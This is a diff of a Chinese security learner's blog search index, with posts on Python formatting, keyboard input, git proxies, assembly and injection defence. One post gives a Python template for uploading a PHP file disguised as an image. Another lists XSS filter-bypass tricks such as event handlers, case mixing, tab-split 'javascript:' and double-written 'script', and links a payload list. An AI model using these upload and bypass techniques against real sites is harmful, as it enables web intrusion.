<span class="keyword">if</span> key==<span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                <span class="comment">#go_forward()</span></span><br><span class="line">                <span class="comment"># print(&quot;\032[1m;33m保留\033[0m &quot;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;保留&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> key==<span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">                <span class="comment">#go_back()</span></span><br><span class="line">                <span class="comment"># print(&quot;\033[1m;33m跳过\033[0m &quot;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;跳过&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> key==<span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">                <span class="comment"># print(&quot;\031[1m;33m退出\033[0m &quot;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;退出&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+    <title>python format() 格式化输出</title>
+    <url>/2020/10/18/python%20format()%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13806255.html">源地址：https://www.cnblogs.com/This-is-Y/p/13806255.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><strong>进制转换问题</strong></p>
+<p>二进制-Binary-b</p>
+<p>八进制-Octal-o</p>
+<p>十进制-Decimal-d</p>
+<p>十六进制-Hexadecimal-x</p>
+<p>效果如图</p>
+<img src="1503868-20201018092410558-702270383.png" alt>
+
+<p> </p>
+<p>代码👇</p>
+<p> </p>
+<p>位置匹配</p>
+<p>效果</p>
+<img src="1503868-20201018093842583-71552239.png" alt loading="lazy">
+
+<p> </p>
+<p>代码👇</p>
+<p> 参考：<a class="link" href="https://www.cnblogs.com/fat39/p/7159881.html">https://www.cnblogs.com/fat39/p/7159881.html<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
   </entry>
   <entry>
     <title>python多线程失败，一直只有一个线程的解决办法</title>
@@ -15983,6 +16107,35 @@ SELECT mid(USER(),1,1) in (&quot;r&quot;)
       <categories>
         <category>cnblogs</category>
       </categories>
+  </entry>
+  <entry>
+    <title>python写poc时的笔记</title>
+    <url>/2021/12/02/python%E5%86%99poc%E6%97%B6%E7%9A%84%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h3 id="requests请求"><a href="#requests请求" class="headerlink" title="requests请求"></a>requests请求</h3><p>在批量验证是，不要直接写<br>    rsp=request.get<br>这一块尽可能的使用try，同时设置timeout和verify<br>    verify=False, timeout=25<br>如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    rsp = requests.post(url=url,headers=headers,files=uploaddata,verify=<span class="literal">False</span>, timeout=<span class="number">25</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="multipart文件上传"><a href="#multipart文件上传" class="headerlink" title="multipart文件上传"></a>multipart文件上传</h3><p>   python发送一个文件上传的请求包，这里我使用的requests包，因为没找到直接在数据包里修改数据的办法，所以我采取的办法是先建立一个文件，在打开一个它。</p>
+<p>注意这里使用的是files=uploaddata，指定files，如果用的data，那就不是上传文件了。<del>（花了一小时在这上面，太憨憨了）</del></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test2.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">       <span class="comment"># f.write(&#x27;&lt;?php echo &quot;py&quot;;phpinfo();?&gt;\n&#x27;)</span></span><br><span class="line">       f.write(<span class="string">&#x27;hello world\n&#x27;</span>)</span><br><span class="line">   uploaddata = &#123;</span><br><span class="line">   	<span class="string">&#x27;Filedata&#x27;</span>:(<span class="string">&#x27;test.php&#x27;</span>,<span class="built_in">open</span>(<span class="string">&#x27;test2.php&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;image/jpeg&#x27;</span>) <span class="comment"># image或者file</span></span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">       rsp = requests.post(url=url,headers=headers,files=uploaddata,verify=<span class="literal">False</span>, timeout=<span class="number">25</span>)</span><br><span class="line">   <span class="keyword">except</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+]]></content>
+  </entry>
+  <entry>
+    <title>python实时输入检测</title>
+    <url>/2021/10/11/python%E5%AE%9E%E6%97%B6%E8%BE%93%E5%85%A5%E6%A3%80%E6%B5%8B/</url>
+    <content><![CDATA[<p>简单说一下功能和缺点</p>
+<ul>
+<li>功能：可以实时检测输入的按键，不用按回车</li>
+<li>缺点：只能在linux下运行，windows下运行会报错ModuleNotFoundError: No module named ‘termios’，</li>
+</ul>
+<p>在windows上可以考虑使用wsl，子系统来运行代码，亲测有效，不过产生了一个新的小问题，ctrl+c没法停止程序了。所以写的时候可以留一个关键字用来跳出循环<br><img src="image-20211011161726975.png" alt="image-20211011161726975"></p>
+<p>上代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> tty</span><br><span class="line"><span class="keyword">import</span> termios</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readchar</span>():</span></span><br><span class="line">        fd = sys.stdin.fileno()</span><br><span class="line">        old_settings = termios.tcgetattr(fd)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">                tty.setraw(sys.stdin.fileno())</span><br><span class="line">                ch = sys.stdin.read(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">                termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)</span><br><span class="line">        <span class="keyword">return</span> ch</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readkey</span>(<span class="params">getchar_fn=<span class="literal">None</span></span>):</span></span><br><span class="line">        getchar = getchar_fn <span class="keyword">or</span> readchar</span><br><span class="line">        c1 = getchar()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(c1) != <span class="number">0x1b</span>:</span><br><span class="line">                <span class="keyword">return</span> c1</span><br><span class="line">        c2 = getchar()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(c2) != <span class="number">0x5b</span>:</span><br><span class="line">                <span class="keyword">return</span> c1</span><br><span class="line">        c3 = getchar()</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">chr</span>(<span class="number">0x10</span> + <span class="built_in">ord</span>(c3) - <span class="number">65</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        key=readkey()</span><br><span class="line">        <span class="keyword">if</span> key==<span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                <span class="comment">#go_forward()</span></span><br><span class="line">                <span class="comment"># print(&quot;\032[1m;33m保留\033[0m &quot;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;保留&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> key==<span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">                <span class="comment">#go_back()</span></span><br><span class="line">                <span class="comment"># print(&quot;\033[1m;33m跳过\033[0m &quot;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;跳过&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> key==<span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">                <span class="comment"># print(&quot;\031[1m;33m退出\033[0m &quot;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;退出&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
   </entry>
   <entry>
     <title>python爬虫使用lxml解析数据编码乱码问题</title>
@@ -16511,14 +16664,14 @@ SELECT mid(USER(),1,1) in (&quot;r&quot;)
 <p> 　　这边的参数选项。</p>
 <p>　　<strong>SMTP host：</strong> 即qq邮箱SMTP服务地址，smtp.qq.com。这个可以自行百度。这里有一篇博客写了这些，但是端口号似乎有些不对，还请自行判断<a class="link" href="https://blog.csdn.net/Gents_hu/article/details/92219811">https://blog.csdn.net/Gents_hu/article/details/92219811<i class="fas fa-external-link-alt"></i></a></p>
 <p>　　<strong>SMTP Port：</strong>即允许SMTP服务的端口号。和上面的host配套来的，这边QQ邮箱的端口号是 465</p>
-<p>　　<strong>Username：</strong>举个例子。比如我的邮箱地址是<a class="link" href="mailto:&#x39;&#x35;&#x32;&#x37;&#x31;&#x34;&#x31;&#x33;&#x38;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#109;">&#x39;&#x35;&#x32;&#x37;&#x31;&#x34;&#x31;&#x33;&#x38;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#109;<i class="fas fa-external-link-alt"></i></a>，那这里就填952714138。就是@符号前面的那个</p>
+<p>　　<strong>Username：</strong>举个例子。比如我的邮箱地址是<a class="link" href="mailto:&#x39;&#x35;&#x32;&#55;&#49;&#52;&#x31;&#51;&#56;&#x40;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d;">&#x39;&#x35;&#x32;&#55;&#49;&#52;&#x31;&#51;&#56;&#x40;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d;<i class="fas fa-external-link-alt"></i></a>，那这里就填952714138。就是@符号前面的那个</p>
 <p>　　<strong>Password（密码）：</strong>就是前面开启SMTP服务是的那串神秘代码，不是你的qq密码！不是你的qq密码！不是你的qq密码！</p>
 <p>　　<strong>Random Delay：</strong>似乎是等待随机延迟发送（我瞎猜的）。这里默认0就好了。</p>
 <p>　　<strong>Connetion：</strong>连接协议，qq邮箱SMTP服务用的ssl连接，所以这里选ssl</p>
 <p>　　配置好后大概是这个样子</p>
 <p>　　<img src="1503868-20200618201058685-518424786.png" alt loading="lazy"></p>
 <p>　　点解set保存设置。</p>
-<p><strong>bounce to：</strong>这个是根据你的邮件名来填写的，比方说我的邮件地址是<a class="link" href="mailto:&#57;&#x35;&#50;&#x37;&#x31;&#x34;&#49;&#x33;&#56;&#64;&#x71;&#x71;&#46;&#x63;&#111;&#x6d;">&#57;&#x35;&#50;&#x37;&#x31;&#x34;&#49;&#x33;&#56;&#64;&#x71;&#x71;&#46;&#x63;&#111;&#x6d;<i class="fas fa-external-link-alt"></i></a>，那么这里就填写<a class="link" href="mailto:&#x39;&#53;&#50;&#55;&#49;&#x34;&#49;&#51;&#x38;&#64;&#113;&#x71;&#46;&#x63;&#111;&#109;">&#x39;&#53;&#50;&#55;&#49;&#x34;&#49;&#51;&#x38;&#64;&#113;&#x71;&#46;&#x63;&#111;&#109;<i class="fas fa-external-link-alt"></i></a>。当然，qq邮箱有一个英文邮箱账号，填写那个也是可以的。如果填写不正确，cs会报错</p>
+<p><strong>bounce to：</strong>这个是根据你的邮件名来填写的，比方说我的邮件地址是<a class="link" href="mailto:&#57;&#x35;&#50;&#55;&#49;&#52;&#x31;&#x33;&#x38;&#64;&#x71;&#x71;&#46;&#x63;&#x6f;&#x6d;">&#57;&#x35;&#50;&#55;&#49;&#52;&#x31;&#x33;&#x38;&#64;&#x71;&#x71;&#46;&#x63;&#x6f;&#x6d;<i class="fas fa-external-link-alt"></i></a>，那么这里就填写<a class="link" href="mailto:&#57;&#53;&#50;&#55;&#49;&#52;&#49;&#x33;&#x38;&#x40;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;">&#57;&#53;&#50;&#55;&#49;&#52;&#49;&#x33;&#x38;&#x40;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;<i class="fas fa-external-link-alt"></i></a>。当然，qq邮箱有一个英文邮箱账号，填写那个也是可以的。如果填写不正确，cs会报错</p>
 <img src="1503868-20200618195101320-369498795.png" alt loading="lazy">
 
 <p> </p>
@@ -17163,6 +17316,45 @@ SELECT mid(USER(),1,1) in (&quot;r&quot;)
       </categories>
   </entry>
   <entry>
+    <title>安装zsh时git太慢，换代理</title>
+    <url>/2020/12/21/%E5%AE%89%E8%A3%85zsh%E6%97%B6git%E5%A4%AA%E6%85%A2%EF%BC%8C%E6%8D%A2%E4%BB%A3%E7%90%86/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14170330.html">源地址：https://www.cnblogs.com/This-is-Y/p/14170330.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>电脑用的<img src="1503868-20201221215539766-413682498.png" loading="lazy" style="vertical-align: top">进行科学冲浪，开启的全局（也不知道开PAC有没有用，没去测试了）</p>
+<p> </p>
+<p>端口如下</p>
+<img src="1503868-20201221215149658-220143656.png" alt loading="lazy">
+
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p>来自<a class="link" href="https://gist.github.com/laispace/666dd7b27e9116faece6">https://gist.github.com/laispace/666dd7b27e9116faece6<i class="fas fa-external-link-alt"></i></a></p>
+<p>给git设置代理</p>
+<p> git config –global http.proxy ‘socks5://127.0.0.1:10808’<br> git config –global https.proxy ‘socks5://127.0.0.1:10808’</p>
+<p> </p>
+<p>取消代理</p>
+<p>git config –global –unset http.proxy</p>
+<p>git config –global –unset https.proxy</p>
+<p> </p>
+<p> </p>
+<p> </p>
+<img src="1503868-20201221215342041-839913743.png" alt loading="lazy">
+
+<p> </p>
+<p> </p>
+<p> 这种情况是没配置好</p>
+<img src="1503868-20201221215434314-1677226010.png" alt loading="lazy">
+
+<p> </p>
+<p> </p>
+<p> 有个代理git起来是真滴快</p>
+<p> </p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
     <title>对某菠菜网站的渗透学习</title>
     <url>/2020/06/07/%E5%AF%B9%E6%9F%90%E8%8F%A0%E8%8F%9C%E7%BD%91%E7%AB%99%E7%9A%84%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13061165.html">源地址：https://www.cnblogs.com/This-is-Y/p/13061165.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -17212,45 +17404,6 @@ SELECT mid(USER(),1,1) in (&quot;r&quot;)
 <p> </p>
 <p> </p>
 <p> </p>
-<p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>安装zsh时git太慢，换代理</title>
-    <url>/2020/12/21/%E5%AE%89%E8%A3%85zsh%E6%97%B6git%E5%A4%AA%E6%85%A2%EF%BC%8C%E6%8D%A2%E4%BB%A3%E7%90%86/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14170330.html">源地址：https://www.cnblogs.com/This-is-Y/p/14170330.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>电脑用的<img src="1503868-20201221215539766-413682498.png" loading="lazy" style="vertical-align: top">进行科学冲浪，开启的全局（也不知道开PAC有没有用，没去测试了）</p>
-<p> </p>
-<p>端口如下</p>
-<img src="1503868-20201221215149658-220143656.png" alt loading="lazy">
-
-<p> </p>
-<p> </p>
-<p> </p>
-<p> </p>
-<p>来自<a class="link" href="https://gist.github.com/laispace/666dd7b27e9116faece6">https://gist.github.com/laispace/666dd7b27e9116faece6<i class="fas fa-external-link-alt"></i></a></p>
-<p>给git设置代理</p>
-<p> git config –global http.proxy ‘socks5://127.0.0.1:10808’<br> git config –global https.proxy ‘socks5://127.0.0.1:10808’</p>
-<p> </p>
-<p>取消代理</p>
-<p>git config –global –unset http.proxy</p>
-<p>git config –global –unset https.proxy</p>
-<p> </p>
-<p> </p>
-<p> </p>
-<img src="1503868-20201221215342041-839913743.png" alt loading="lazy">
-
-<p> </p>
-<p> </p>
-<p> 这种情况是没配置好</p>
-<img src="1503868-20201221215434314-1677226010.png" alt loading="lazy">
-
-<p> </p>
-<p> </p>
-<p> 有个代理git起来是真滴快</p>
 <p> </p>
 ]]></content>
       <categories>
@@ -17661,38 +17814,6 @@ insert into test1 value(3,15);
       </categories>
   </entry>
   <entry>
-    <title>浅谈xss的各种触发方式以及防护绕过</title>
-    <url>/2020/03/07/%E6%B5%85%E8%B0%88xss%E7%9A%84%E5%90%84%E7%A7%8D%E8%A7%A6%E5%8F%91%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12438723.html">源地址：https://www.cnblogs.com/This-is-Y/p/12438723.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>触发方式都写在里面了</p>
-<img src="1503868-20200307205424570-687485412.png" alt width="1008" height="359">
-
-<p> </p>
-<p> </p>
-<p>只写部分，更多触发事件可以参考这两篇文章</p>
-<p><a class="link" href="https://blog.csdn.net/qq_36374896/article/details/82755793">https://blog.csdn.net/qq_36374896/article/details/82755793<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link" href="https://www.cnblogs.com/webzhuo/p/4155594.html">https://www.cnblogs.com/webzhuo/p/4155594.html<i class="fas fa-external-link-alt"></i></a></p>
-<p> </p>
-<p>再说一下防护：</p>
-<p>输入检测：</p>
-<p>htmlspecialchars函数：用来把一些预定义的字符转换为HTML实体,默认不开启对单引号的过滤</p>
-<p>　　绕过:用onmouseover或者onclick等方式，像xsslabs里第2,3,4题就是用onclick</p>
-<p>关键字黑名单：</p>
-<p>　　换一个关键字，反正上面有这么多。</p>
-<p>　　用html字符实体编码，网站<a class="link" href="https://www.qqxiuzi.cn/bianma/zifushiti.php">https://www.qqxiuzi.cn/bianma/zifushiti.php<i class="fas fa-external-link-alt"></i></a></p>
-<p>　　或者用大小写绕过</p>
-<p>　　或者使用tab制表符，空格，回车等（比如jav ascri pt:alert(1) 。这个要先在别的文本框输入tab进去（有些情况下，按下tab就跳到下一个别的地方去了），在把payload复制过来使用。</p>
-<p>　　当遇到清除关键字的时候，可以尝试双写绕过，scriscriptpt，清除一个script后，剩下的拼接回来又是一个script，这个在注入里面也会用到</p>
-<p> </p>
-<p>同时昨天通过学长，得到一大票xsspayload，也放在这里，可以拿来爆破</p>
-<p><a class="link" href="https://github.com/TheKingOfDuck/easyXssPayload">https://github.com/TheKingOfDuck/easyXssPayload<i class="fas fa-external-link-alt"></i></a></p>
-<p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
     <title>注入的原理以及防御</title>
     <url>/2021/04/04/%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E9%98%B2%E5%BE%A1/</url>
     <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>参考自：<a class="link" href="https://juejin.cn/post/6844903917654900743">https://juejin.cn/post/6844903917654900743<i class="fas fa-external-link-alt"></i></a></p>
@@ -17732,6 +17853,38 @@ insert into test1 value(3,15);
 <h3 id="严格的参数校验"><a href="#严格的参数校验" class="headerlink" title="严格的参数校验"></a>严格的参数校验</h3><p>拿正则或者其他的函数，过滤掉不该出现的关键字或字符</p>
 <h3 id="owasp-top10中关于如何防止注入"><a href="#owasp-top10中关于如何防止注入" class="headerlink" title="owasp top10中关于如何防止注入"></a>owasp top10中关于如何防止注入</h3><p>防止注入漏洞需要将数据与命令语句、查询语句分隔开来。<br>• 最佳选择是使用安全的API，完全避免使用解释器，或提供参数化界面的接口，或迁移到ORM或实体框架。<br>  <strong>注意：当参数化时，存储过程仍然可以引入SQL注入，如果PL/SQL或T-SQL将查询和数据连接在一起，或者执行带有立即执行或exec()的恶意数据。</strong><br>• 使用正确的或“白名单”的具有恰当规范化的输入验证方法同样会有助于防止注入攻击，但这不是一个完整的防御，因为许多应用程序在输入中需要特殊字符，例如文本区域或移动应用程序的API。<br>• 对于任何剩余的动态查询，可以使用该解释器的特定转义语法转义特殊字符。OWASP的Java Encoder和类似的库提供了这样的转义例程。<br>  <strong>注意：SQL结构，比如：表名、列名等无法转义，因此用户提供的结构名是非常危险的。这是编写软件中的一个常见问题。</strong><br>• 在查询中使用LIMIT和其他SQL控件，以防止在SQL注入时大量地泄露记录。</p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>浅谈xss的各种触发方式以及防护绕过</title>
+    <url>/2020/03/07/%E6%B5%85%E8%B0%88xss%E7%9A%84%E5%90%84%E7%A7%8D%E8%A7%A6%E5%8F%91%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12438723.html">源地址：https://www.cnblogs.com/This-is-Y/p/12438723.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>触发方式都写在里面了</p>
+<img src="1503868-20200307205424570-687485412.png" alt width="1008" height="359">
+
+<p> </p>
+<p> </p>
+<p>只写部分，更多触发事件可以参考这两篇文章</p>
+<p><a class="link" href="https://blog.csdn.net/qq_36374896/article/details/82755793">https://blog.csdn.net/qq_36374896/article/details/82755793<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" href="https://www.cnblogs.com/webzhuo/p/4155594.html">https://www.cnblogs.com/webzhuo/p/4155594.html<i class="fas fa-external-link-alt"></i></a></p>
+<p> </p>
+<p>再说一下防护：</p>
+<p>输入检测：</p>
+<p>htmlspecialchars函数：用来把一些预定义的字符转换为HTML实体,默认不开启对单引号的过滤</p>
+<p>　　绕过:用onmouseover或者onclick等方式，像xsslabs里第2,3,4题就是用onclick</p>
+<p>关键字黑名单：</p>
+<p>　　换一个关键字，反正上面有这么多。</p>
+<p>　　用html字符实体编码，网站<a class="link" href="https://www.qqxiuzi.cn/bianma/zifushiti.php">https://www.qqxiuzi.cn/bianma/zifushiti.php<i class="fas fa-external-link-alt"></i></a></p>
+<p>　　或者用大小写绕过</p>
+<p>　　或者使用tab制表符，空格，回车等（比如jav ascri pt:alert(1) 。这个要先在别的文本框输入tab进去（有些情况下，按下tab就跳到下一个别的地方去了），在把payload复制过来使用。</p>
+<p>　　当遇到清除关键字的时候，可以尝试双写绕过，scriscriptpt，清除一个script后，剩下的拼接回来又是一个script，这个在注入里面也会用到</p>
+<p> </p>
+<p>同时昨天通过学长，得到一大票xsspayload，也放在这里，可以拿来爆破</p>
+<p><a class="link" href="https://github.com/TheKingOfDuck/easyXssPayload">https://github.com/TheKingOfDuck/easyXssPayload<i class="fas fa-external-link-alt"></i></a></p>
+<p> </p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
   </entry>
   <entry>
     <title>渗透三字经</title>
@@ -17775,6 +17928,35 @@ insert into test1 value(3,15);
 <li><p>如果是web应用，找到web日志文件，删除 </p>
 </li>
 </ol>
+]]></content>
+  </entry>
+  <entry>
+    <title>瞎写的汇编笔记</title>
+    <url>/2021/11/06/%E7%9E%8E%E5%86%99%E7%9A%84%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<p>按王爽的第四版《汇编语言》目录来的、<br>下载地址：<a class="link" href="http://www.j9p.com/down/527982.html">http://www.j9p.com/down/527982.html<i class="fas fa-external-link-alt"></i></a><br>课后答案：<a class="link" href="https://max.book118.com/html/2018/0304/155683552.shtm">https://max.book118.com/html/2018/0304/155683552.shtm<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h1><p>指令和数据是应用上的概念，在内存或磁盘中没有区别，都是二进制信息<br>例如，内存中的二进制信息1000100111011000， 计算机可以把它看作大小为89D8H的数据来处理，也可以将其看作指令mov ax,bx来执行。</p>
+<p>比特 - bit - b<br>字节 - Byte - B == 8*b</p>
+<p>CPU要想进行数据的读写，必须和外部器件(标准的说法是芯片)进行下面3类信息的交互。</p>
+<ul>
+<li>存储单元的地址(地址信息);</li>
+<li>器件的选择，读或写的命令(控制信息);</li>
+<li>读或写的数据(数据信息)。</li>
+</ul>
+<p>每一个CPU芯片都有许多管脚，这些管脚和总线相连。也可以说，这些管脚引出总线。一个CPU可以引出3种总线的宽度标志了这个CPU的不同方面的性能:</p>
+<ul>
+<li>地址总线的宽度决定了CPU的寻址能力;</li>
+<li>数据总线的宽度决定了CPU与其他器件进行数据传送时的-次数据传送量;</li>
+<li>控制总线的宽度决定了CPU对系统中其他器件的控制能力。</li>
+</ul>
+<h1 id="2-寄存器"><a href="#2-寄存器" class="headerlink" title="2. 寄存器"></a>2. 寄存器</h1><p>通用寄存器<br>AX，BX，CX，DX<br>又可以细分为<br>AH,AL,  BH,BL,  CH,CL,  DH,DL<br>低八位为L，<br>高八位为H，</p>
+<p><img src="image-20211106142002603.png" alt="image-20211106142002603"></p>
+<p>20000的2进制为0100111000100000，低八位为00100000，高八位为01001110<br><img src="image-20211106142635332.png" alt="image-20211106142635332"></p>
+<p>字节 - byte - 1Byte - 8bit<br>字 - word - 2Byte - 16bit（一个寄存器大小）</p>
+<p><img src="image-20211106144039395.png" alt="image-20211106144039395"></p>
+<p><img src="image-20211106144242478.png" alt="image-20211106144242478"></p>
+<p>汇编指令不区分大小写</p>
+<p>段寄存器</p>
+<p>CS, DS, SS, ES</p>
 ]]></content>
   </entry>
   <entry>
@@ -17828,35 +18010,6 @@ insert into test1 value(3,15);
       <categories>
         <category>cnblogs</category>
       </categories>
-  </entry>
-  <entry>
-    <title>瞎写的汇编笔记</title>
-    <url>/2021/11/06/%E7%9E%8E%E5%86%99%E7%9A%84%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<p>按王爽的第四版《汇编语言》目录来的、<br>下载地址：<a class="link" href="http://www.j9p.com/down/527982.html">http://www.j9p.com/down/527982.html<i class="fas fa-external-link-alt"></i></a><br>课后答案：<a class="link" href="https://max.book118.com/html/2018/0304/155683552.shtm">https://max.book118.com/html/2018/0304/155683552.shtm<i class="fas fa-external-link-alt"></i></a></p>
-<h1 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h1><p>指令和数据是应用上的概念，在内存或磁盘中没有区别，都是二进制信息<br>例如，内存中的二进制信息1000100111011000， 计算机可以把它看作大小为89D8H的数据来处理，也可以将其看作指令mov ax,bx来执行。</p>
-<p>比特 - bit - b<br>字节 - Byte - B == 8*b</p>
-<p>CPU要想进行数据的读写，必须和外部器件(标准的说法是芯片)进行下面3类信息的交互。</p>
-<ul>
-<li>存储单元的地址(地址信息);</li>
-<li>器件的选择，读或写的命令(控制信息);</li>
-<li>读或写的数据(数据信息)。</li>
-</ul>
-<p>每一个CPU芯片都有许多管脚，这些管脚和总线相连。也可以说，这些管脚引出总线。一个CPU可以引出3种总线的宽度标志了这个CPU的不同方面的性能:</p>
-<ul>
-<li>地址总线的宽度决定了CPU的寻址能力;</li>
-<li>数据总线的宽度决定了CPU与其他器件进行数据传送时的-次数据传送量;</li>
-<li>控制总线的宽度决定了CPU对系统中其他器件的控制能力。</li>
-</ul>
-<h1 id="2-寄存器"><a href="#2-寄存器" class="headerlink" title="2. 寄存器"></a>2. 寄存器</h1><p>通用寄存器<br>AX，BX，CX，DX<br>又可以细分为<br>AH,AL,  BH,BL,  CH,CL,  DH,DL<br>低八位为L，<br>高八位为H，</p>
-<p><img src="image-20211106142002603.png" alt="image-20211106142002603"></p>
-<p>20000的2进制为0100111000100000，低八位为00100000，高八位为01001110<br><img src="image-20211106142635332.png" alt="image-20211106142635332"></p>
-<p>字节 - byte - 1Byte - 8bit<br>字 - word - 2Byte - 16bit（一个寄存器大小）</p>
-<p><img src="image-20211106144039395.png" alt="image-20211106144039395"></p>
-<p><img src="image-20211106144242478.png" alt="image-20211106144242478"></p>
-<p>汇编指令不区分大小写</p>
-<p>段寄存器</p>
-<p>CS, DS, SS, ES</p>
-]]></content>
   </entry>
   <entry>
     <title>第一次面试总结</title>
